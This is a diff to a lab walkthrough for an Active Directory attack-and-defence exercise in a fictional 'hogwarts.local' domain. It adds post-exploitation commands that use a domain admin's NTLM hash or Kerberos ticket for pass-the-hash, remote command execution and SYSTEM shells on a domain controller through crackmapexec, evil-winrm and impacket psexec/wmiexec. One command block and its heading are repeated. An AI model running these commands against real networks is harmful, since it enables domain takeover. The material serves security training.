@@ -149,6 +149,30 @@ HOGWARTS\severus.snape is a domain admin user. <br>
 ```
 <img src="https://github.com/user-attachments/assets/8b307664-d079-40b6-bde9-d0dcaf60ee60">
 
+### Step4-Sample Commands for Further Activities
+
+```console
+# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
+# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1 -x whoami
+# evil-winrm -i 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
+```
+If NTLM authentication is disabled,
+
+```console
+# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
+# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1 -x whoami
+# evil-winrm -i 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
+```
+If NTLM authentication is disabled 
+
+```console
+export KRB5CCNAME=severus.snape.ccache;impacket-psexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k hogwarts.local/severus.snape@DC01.hogwarts.local -debug
+export KRB5CCNAME=severus.snape.ccache;impacket-wmiexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k hogwarts.local/severus.snape@DC01.hogwarts.local -debug
+export KRB5CCNAME=severus.snape.ccache;impacket-psexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k @DC01.hogwarts.local -debug
+export KRB5CCNAME=severus.snape.ccache;impacket-wmiexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k @DC01.hogwarts.local -debug
+```
+> [!NOTE]  
+> Be careful when using impacket-psexec. Because this command creates a random 8-character exe file,which gives the system shell by token impersonating, in the ADMIN$ share. This exe file is considered malicious by AVs and EDRs.
 
 ## Blue Team Activity
 
